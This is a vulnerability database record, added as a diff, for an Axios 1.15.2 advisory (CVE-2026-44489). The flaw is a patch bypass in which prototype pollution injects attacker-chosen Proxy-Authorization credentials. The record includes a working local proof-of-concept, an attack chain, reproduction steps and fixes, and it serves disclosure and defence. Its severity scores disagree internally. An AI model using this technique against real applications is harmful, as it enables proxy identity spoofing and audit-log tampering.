@@ -1,0 +1,316 @@
+advisory_id: GHSA-654m-c8p4-x5fp
+datasource_id: github_osv/GHSA-654m-c8p4-x5fp
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-654m-c8p4-x5fp/GHSA-654m-c8p4-x5fp.json
+aliases:
+  - CVE-2026-44489
+summary: |
+  Axios has a Patch Bypass: Proxy-Authorization Header Injection via Prototype Pollution — Incomplete Null-Prototype Fix
+  # [Patch Bypass] Proxy-Authorization Header Injection via Prototype Pollution — Incomplete Null-Prototype Fix in Axios 1.15.2
+
+  ## Summary
+
+  The `Object.create(null)` fix introduced in Axios 1.15.2 (GHSA-q8qp-cvcw-x6jj) protects the **top-level config object** from prototype pollution. However, **nested objects** created by `utils.merge()` (e.g., `config.proxy`) are still constructed as plain `{}` with `Object.prototype` in their chain.
+
+  The `setProxy()` function at `lib/adapters/http.js:209-223` reads `proxy.username`, `proxy.password`, and `proxy.auth` **without `hasOwnProperty` checks**. When `Object.prototype.username` is polluted, `setProxy()` constructs a `Proxy-Authorization` header with attacker-controlled credentials and injects it into **every proxied HTTP request**.
+
+  **Severity:** Medium (CVSS 5.4)
+  **Affected Versions:** 1.15.2 (and potentially 1.15.1)
+  **Vulnerable Component:** `lib/adapters/http.js` (`setProxy()`) + `lib/utils.js` (`merge()`)
+
+  ## CWE
+
+  - **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
+  - **CWE-113:** Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')
+
+  ## CVSS 3.1
+
+  **Score: 5.6 (Medium)**
+
+  Vector: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L`
+
+  | Metric | Value | Justification |
+  |---|---|---|
+  | Attack Vector | Network | PP triggered remotely via vulnerable dependency |
+  | Attack Complexity | **High** | Requires **two** preconditions: (1) PP in dependency tree, AND (2) the application must explicitly configure `config.proxy`. Unlike GHSA-q8qp-cvcw-x6jj which affected all requests unconditionally |
+  | Privileges Required | None | No authentication needed |
+  | User Interaction | None | No user interaction required |
+  | Scope | Unchanged | Within the proxy authentication context |
+  | Confidentiality | **Low** | Attacker-controlled identity appears in proxy authentication logs, but the attacker does NOT see request/response data (unlike `config.baseURL` hijack) |
+  | Integrity | **Low** | Proxy-Authorization header injected; proxy may apply different access policies based on injected identity |
+  | Availability | **Low** | If proxy rejects the injected credentials, legitimate requests may fail |
+
+  ### Why This Is Lower Severity Than GHSA-q8qp-cvcw-x6jj (7.4 High)
+
+  | Factor | GHSA-q8qp-cvcw-x6jj | This Finding |
+  |---|---|---|
+  | Precondition | **None** — all requests affected | Must have `config.proxy` set |
+  | `config.baseURL` PP | Hijacks **all** relative URL requests | Not applicable |
+  | `config.auth` PP | Injects `Authorization` to **target server** | Only injects `Proxy-Authorization` to **proxy** |
+  | Attacker sees traffic | Yes (via baseURL redirect) | **No** — only proxy identity affected |
+  | Impact scope | Universal — every axios request | Only requests with explicit proxy config |
+
+  ## This Is a Patch Bypass
+
+  This vulnerability **bypasses the fix** introduced in Axios 1.15.2 for GHSA-q8qp-cvcw-x6jj. The fix correctly uses `Object.create(null)` for the config object, blocking direct prototype pollution on `config.proxy`, `config.auth`, etc.
+
+  However, the fix is **incomplete**: when a user legitimately sets `config.proxy = { host: 'proxy.corp', port: 8080 }`, the `mergeConfig()` function passes this object through `utils.merge()`, which creates a **new plain `{}` object** (`lib/utils.js:406: const result = {};`). This new object inherits from `Object.prototype`, re-opening the prototype pollution attack surface on the **nested** proxy object.
+
+  | Layer | Protection | Status |
+  |---|---|---|
+  | `config` (top-level) | `Object.create(null)` | ✓ Fixed |
+  | `config.proxy` (nested) | `utils.merge()` → `const result = {}` | **✗ NOT Fixed** |
+  | `setProxy()` reads | `proxy.username`, `proxy.auth` without `hasOwnProperty` | **✗ NOT Fixed** |
+
+  ## Root Cause Analysis
+
+  ### Step 1: `utils.merge()` creates plain `{}` for nested objects
+
+  **File:** `lib/utils.js`, line 406
+
+  ```javascript
+  function merge(/* obj1, obj2, obj3, ... */) {
+    const result = {};  // ← Plain object with Object.prototype!
+    // ...
+  }
+  ```
+
+  When `mergeConfig()` processes `config.proxy`, `getMergedValue()` calls `utils.merge()`, which creates a plain `{}` for the nested object. This plain object inherits from `Object.prototype`.
+
+  ### Step 2: `setProxy()` reads proxy properties without `hasOwnProperty`
+
+  **File:** `lib/adapters/http.js`, lines 209-223
+
+  ```javascript
+  function setProxy(options, configProxy, location) {
+    let proxy = configProxy;
+    // ...
+    if (proxy) {
+      if (proxy.username) {                    // ← traverses Object.prototype!
+        proxy.auth = (proxy.username || '') + ':' + (proxy.password || '');
+      }
+
+      if (proxy.auth) {                        // ← traverses Object.prototype!
+        const validProxyAuth = Boolean(proxy.auth.username || proxy.auth.password);
+        if (validProxyAuth) {
+          proxy.auth = (proxy.auth.username || '') + ':' + (proxy.auth.password || '');
+        }
+        // ...
+        const base64 = Buffer.from(proxy.auth, 'utf8').toString('base64');
+        options.headers['Proxy-Authorization'] = 'Basic ' + base64;  // ← INJECTED!
+      }
+      // ...
+    }
+  }
+  ```
+
+  ### Complete Attack Chain
+
+  ```
+  Object.prototype.username = 'attacker'
+  Object.prototype.password = 'stolen-creds'
+           │
+           ▼
+    User config: { proxy: { host: 'proxy.corp', port: 8080 } }
+           │
+           ▼
+    mergeConfig() → utils.merge() → new plain {}
+    config.proxy = { host: 'proxy.corp', port: 8080 }  (own properties)
+    config.proxy inherits from Object.prototype         (has .username, .password)
+           │
+           ▼
+    setProxy() at http.js:209:
+      proxy.username → 'attacker' (from Object.prototype) → truthy!
+      proxy.auth = 'attacker' + ':' + 'stolen-creds'
+           │
+           ▼
+    http.js:223: Proxy-Authorization: Basic YXR0YWNrZXI6c3RvbGVuLWNyZWRz
+    Injected into EVERY proxied HTTP request!
+  ```
+
+  ## Proof of Concept
+
+  ```javascript
+  import http from 'http';
+  import axios from './index.js';
+
+  // Proxy server logs received Proxy-Authorization
+  const proxyServer = http.createServer((req, res) => {
+    console.log('Proxy-Authorization:', req.headers['proxy-authorization']);
+    res.writeHead(200);
+    res.end('OK');
+  });
+  await new Promise(r => proxyServer.listen(0, r));
+  const proxyPort = proxyServer.address().port;
+
+  // Target server
+  const target = http.createServer((req, res) => { res.writeHead(200); res.end(); });
+  await new Promise(r => target.listen(0, r));
+
+  // Simulate prototype pollution from vulnerable dependency
+  Object.prototype.username = 'attacker';
+  Object.prototype.password = 'stolen-creds';
+
+  // Developer sets proxy WITHOUT auth — expects no auth header
+  await axios.get(`http://127.0.0.1:${target.address().port}/api`, {
+    proxy: { host: '127.0.0.1', port: proxyPort, protocol: 'http' },
+  });
+
+  // Proxy receives: Proxy-Authorization: Basic YXR0YWNrZXI6c3RvbGVuLWNyZWRz
+  // Decoded: attacker:stolen-creds
+
+  delete Object.prototype.username;
+  delete Object.prototype.password;
+  proxyServer.close();
+  target.close();
+  ```
+
+  ## Reproduction Environment
+
+  ```
+  Axios version: 1.15.2 (latest patched release)
+  Node.js version: v20.20.2
+  OS: macOS Darwin 25.4.0
+  ```
+
+  ## Reproduction Steps
+
+  ```bash
+  # 1. Install axios 1.15.2
+  npm pack axios@1.15.2
+  tar xzf axios-1.15.2.tgz && mv package axios-1.15.2
+  cd axios-1.15.2 && npm install
+
+  # 2. Save PoC as poc.mjs (code from Section 7 above)
+
+  # 3. Run
+  node poc.mjs
+  ```
+
+  ## Verified PoC Output
+
+  ```
+  === Axios 1.15.2: PP → Proxy-Authorization Injection ===
+
+  [1] Normal request with proxy (no auth):
+    Proxy-Authorization: none
+
+  [2] Prototype Pollution: Object.prototype.username = "attacker"
+    Proxy-Authorization: Basic YXR0YWNrZXI6c3RvbGVuLWNyZWRz
+    Decoded: attacker:stolen-creds
+    → PP injected proxy credentials: attacker:stolen-creds
+
+  [3] Impact:
+    ✗ Attacker injects Proxy-Authorization into all proxied requests
+    ✗ If proxy logs auth, attacker credential appears in proxy logs
+    ✗ If proxy authenticates based on this, attacker controls proxy identity
+    ✗ Works on 1.15.2 despite null-prototype config fix
+    ✗ Root cause: proxy object is plain {} from utils.merge, NOT null-prototype
+  ```
+
+  ### Confirming the Bypass Mechanism
+
+  ```
+  Direct PP (config.proxy) — BLOCKED by 1.15.2:
+    Object.prototype.proxy = { host: 'evil' }
+    config.proxy = undefined            ← null-prototype blocks ✓
+
+  Nested PP (proxy.username) — BYPASSES 1.15.2:
+    Object.prototype.username = 'attacker'
+    config.proxy = { host: 'legit', port: 8080 }  ← user-set, own properties
+    config.proxy own keys: ['host', 'port']        ← username NOT own
+    config.proxy.username = 'attacker'             ← inherited from Object.prototype!
+    hasOwn(config.proxy, 'username') = false
+  ```
+  ```
+
+  ## Impact Analysis
+
+  - **Proxy Identity Spoofing:** The injected `Proxy-Authorization` header authenticates all requests to the proxy as the attacker. If the proxy enforces authentication-based access control or logging, the attacker controls the identity.
+  - **Proxy Log Poisoning:** Proxy servers that log authenticated usernames will record "attacker" instead of the real user, enabling audit trail manipulation.
+  - **Credential Injection Amplification:** If the proxy forwards the `Proxy-Authorization` header upstream (some transparent proxies do), the attacker's credentials propagate through the proxy chain.
+  - **Universal Scope When Proxy Is Configured:** Affects every axios request that uses a proxy configuration without explicit auth — a common pattern in corporate environments.
+
+  ### Prerequisite
+
+  - Application must use `config.proxy` (explicit proxy configuration)
+  - A separate prototype pollution vulnerability must exist in the dependency tree
+  - `Object.prototype.username` or `Object.prototype.auth` must be polluted
+
+  ## Recommended Fix
+
+  ### Fix 1: Use `hasOwnProperty` in `setProxy()`
+
+  ```javascript
+  function setProxy(options, configProxy, location) {
+    let proxy = configProxy;
+    // ...
+    if (proxy) {
+      const hasOwn = (obj, key) => Object.prototype.hasOwnProperty.call(obj, key);
+
+      if (hasOwn(proxy, 'username')) {
+        proxy.auth = (proxy.username || '') + ':' + (proxy.password || '');
+      }
+
+      if (hasOwn(proxy, 'auth')) {
+        // ... existing auth handling ...
+      }
+    }
+  }
+  ```
+
+  ### Fix 2: Use null-prototype objects in `utils.merge()`
+
+  ```javascript
+  // lib/utils.js line 406
+  function merge(/* obj1, obj2, obj3, ... */) {
+    const result = Object.create(null);  // ← null-prototype for nested objects too
+    // ...
+  }
+  ```
+
+  ### Fix 3 (Comprehensive): Apply null-prototype to all objects created by `getMergedValue()`
+
+  ## References
+
+  - [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
+  - [GHSA-q8qp-cvcw-x6jj: Original PP Gadgets Fix (Axios 1.15.2)](https://github.com/advisories/GHSA-q8qp-cvcw-x6jj)
+  - [GHSA-fvcv-3m26-pcqx: Related PP Gadget (Axios 1.15.0)](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
+  - [Axios GitHub Repository](https://github.com/axios/axios)
+impacted_packages:
+  - purl: pkg:npm/axios
+    affected_versions: vers:npm/1.15.2
+    fixed_versions: vers:npm/1.16.0
+    affected_packages:
+      - pkg:npm/axios@1.15.2
+    fixed_packages:
+      - pkg:npm/axios@1.16.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '3.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-654m-c8p4-x5fp/GHSA-654m-c8p4-x5fp.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-1321
+  - CWE-113
+references:
+  - url: https://github.com/axios/axios
+    reference_type:
+    reference_id:
+  - url: https://github.com/axios/axios/security/advisories/GHSA-654m-c8p4-x5fp
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44489
+    reference_type:
+    reference_id: CVE-2026-44489
+  - url: https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj
+    reference_type:
+    reference_id: GHSA-q8qp-cvcw-x6jj
+exploits: []
